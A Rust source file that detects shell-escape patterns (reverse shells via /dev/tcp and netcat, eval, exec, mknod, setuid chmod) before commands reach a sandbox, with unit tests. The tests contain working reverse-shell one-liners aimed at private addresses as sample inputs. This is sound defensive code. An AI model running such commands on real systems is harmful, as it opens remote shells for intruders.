//! Shell escape detection for sandboxed command execution.
//!
//! Scans command strings for known shell-escalation patterns
//! before passing them to the sandbox executor. Fail-closed design:
//! any detection is treated as a potential escape attempt.

/// Severity of a detected escape pattern.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DetectionSeverity {
    /// Informational — pattern matched but may be benign
    Warn,
    /// Potentially dangerous — should be logged prominently
    Alert,
    /// Likely escape attempt — command should be blocked
    Block,
}

/// A single detection result.
#[derive(Debug, Clone)]
pub struct EscapeDetection {
    pub pattern: &'static str,
    pub severity: DetectionSeverity,
    pub description: &'static str,
}

/// Policy for handling detections.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EscapePolicy {
    /// Warn only, never block (legacy behavior)
    WarnOnly,
    /// Block commands with Block-level detections
    Block,
}

/// Scans shell commands for known escalation patterns.
pub struct ShellEscalationDetector {
    policy: EscapePolicy,
}

impl ShellEscalationDetector {
    pub fn new(policy: EscapePolicy) -> Self {
        Self { policy }
    }

    /// Scan a command string and return all matching detections.
    /// Returns empty vec if the command is clean.
    pub fn scan(&self, command: &str) -> Vec<EscapeDetection> {
        let mut detections = Vec::new();

        // Heredoc — can redirect arbitrary file contents
        if command.contains("<<") || command.contains("<<-") {
            detections.push(EscapeDetection {
                pattern: "heredoc",
                severity: DetectionSeverity::Alert,
                description: "Heredoc redirection can write arbitrary content to files",
            });
        }

        // exec — replaces shell process, can bypass wrappers
        if command.contains("exec ") || command.starts_with("exec ") {
            detections.push(EscapeDetection {
                pattern: "exec",
                severity: DetectionSeverity::Block,
                description: "exec replaces the current process, bypassing sandbox wrappers",
            });
        }

        // eval — double-evaluation, classic injection vector
        if command.contains("eval ") || command.contains("eval\"") || command.contains("eval'") {
            detections.push(EscapeDetection {
                pattern: "eval",
                severity: DetectionSeverity::Block,
                description: "eval performs double-evaluation, a classic injection vector",
            });
        }

        // Subshell escape: $(...) or backticks
        if command.contains("$(") || command.contains('`') {
            detections.push(EscapeDetection {
                pattern: "subshell",
                severity: DetectionSeverity::Alert,
                description: "Command substitution can execute nested commands",
            });
        }

        // Reverse shell patterns
        if command.contains("/dev/tcp/") || command.contains("/dev/udp/") {
            detections.push(EscapeDetection {
                pattern: "reverse_shell",
                severity: DetectionSeverity::Block,
                description: "Direct /dev/tcp or /dev/udp access is a reverse shell indicator",
            });
        }

        if command.contains("nc ") || command.contains("ncat ") {
            let has_listen = command.contains("-l") || command.contains("--listen");
            let has_exec = command.contains("-e") || command.contains("-c");
            if has_listen || has_exec {
                detections.push(EscapeDetection {
                    pattern: "netcat_reverse_shell",
                    severity: DetectionSeverity::Block,
                    description: "Netcat with -e/-c or listen mode is a reverse/bind shell indicator",
                });
            }
        }

        // Chroot escape
        if command.contains("chroot ") {
            detections.push(EscapeDetection {
                pattern: "chroot",
                severity: DetectionSeverity::Alert,
                description: "chroot can be used to create secondary root contexts",
            });
        }

        // Setuid/setgid manipulation
        if command.contains("chmod u+s")
            || command.contains("chmod g+s")
            || command.contains("chmod 4")
            || command.contains("chmod 2")
        {
            detections.push(EscapeDetection {
                pattern: "setuid",
                severity: DetectionSeverity::Alert,
                description: "Setting setuid/setgid bits can escalate privileges",
            });
        }

        // mknod — create device files
        if command.contains("mknod ") {
            detections.push(EscapeDetection {
                pattern: "mknod",
                severity: DetectionSeverity::Block,
                description: "mknod creates device files, enabling raw hardware access",
            });
        }

        detections
    }

    /// Evaluate detections against the active policy.
    /// Returns Ok(()) if the command can proceed, Err with the blocking
    /// detection if it should be blocked.
    pub fn evaluate(&self, command: &str) -> Result<Vec<EscapeDetection>, EscapeDetection> {
        let detections = self.scan(command);

        if self.policy == EscapePolicy::Block {
            if let Some(blocked) = detections.iter().find(|d| d.severity == DetectionSeverity::Block)
            {
                return Err(EscapeDetection {
                    pattern: blocked.pattern,
                    severity: blocked.severity,
                    description: blocked.description,
                });
            }
        }

        Ok(detections)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_command_has_no_detections() {
        let detector = ShellEscalationDetector::new(EscapePolicy::Block);
        let result = detector.evaluate("ls -la /tmp").unwrap();
        assert!(result.is_empty());
    }

    #[test]
    fn detects_eval() {
        let detector = ShellEscalationDetector::new(EscapePolicy::Block);
        assert!(detector.evaluate("eval echo hello").is_err());
    }

    #[test]
    fn detects_exec() {
        let detector = ShellEscalationDetector::new(EscapePolicy::Block);
        assert!(detector.evaluate("exec bash").is_err());
    }

    #[test]
    fn detects_reverse_shell_dev_tcp() {
        let detector = ShellEscalationDetector::new(EscapePolicy::Block);
        assert!(detector
            .evaluate("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
            .is_err());
    }

    #[test]
    fn detects_heredoc_alert_only() {
        let detector = ShellEscalationDetector::new(EscapePolicy::Block);
        // heredoc is Alert, not Block, so evaluate should succeed
        let detections = detector.evaluate("cat <<EOF\nhello\nEOF").unwrap();
        assert!(!detections.is_empty());
        assert_eq!(detections[0].pattern, "heredoc");
    }

    #[test]
    fn warn_only_policy_never_blocks() {
        let detector = ShellEscalationDetector::new(EscapePolicy::WarnOnly);
        // eval would be Block, but WarnOnly allows everything
        let detections = detector.evaluate("eval echo hi").unwrap();
        assert!(detections.iter().any(|d| d.pattern == "eval"));
    }

    #[test]
    fn detects_subshell() {
        let detector = ShellEscalationDetector::new(EscapePolicy::Block);
        let detections = detector.evaluate("echo $(whoami)").unwrap();
        assert!(detections.iter().any(|d| d.pattern == "subshell"));
    }

    #[test]
    fn detects_mknod() {
        let detector = ShellEscalationDetector::new(EscapePolicy::Block);
        assert!(detector.evaluate("mknod /dev/mydev c 1 3").is_err());
    }

    #[test]
    fn detects_netcat_reverse_shell() {
        let detector = ShellEscalationDetector::new(EscapePolicy::Block);
        assert!(detector
            .evaluate("nc -e /bin/bash 10.0.0.1 4444")
            .is_err());
    }
}
